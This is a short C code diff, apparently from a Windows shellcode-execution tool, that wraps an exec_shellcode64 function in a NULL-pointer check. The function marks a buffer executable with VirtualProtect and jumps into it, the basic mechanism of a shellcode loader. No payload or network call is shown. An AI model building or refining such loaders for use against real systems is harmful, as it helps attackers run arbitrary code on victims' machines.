@@ -11,8 +11,11 @@ void exec_shellcode64(unsigned char *shellcode) {
 		printf("shellcode size: %d\n", size);
 	#endif
 
-	int len=strlen(shellcode);
-	DWORD l=0;
-	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
-	(* (int(*)()) shellcode)();
+    // Check for NULL pointer to handle cases where no shellcode data was retrieved
+    if(shellcode != NULL) {
+	    int len=strlen(shellcode);
+	    DWORD l=0;
+	    VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
+	    (* (int(*)()) shellcode)();
+    }
 }
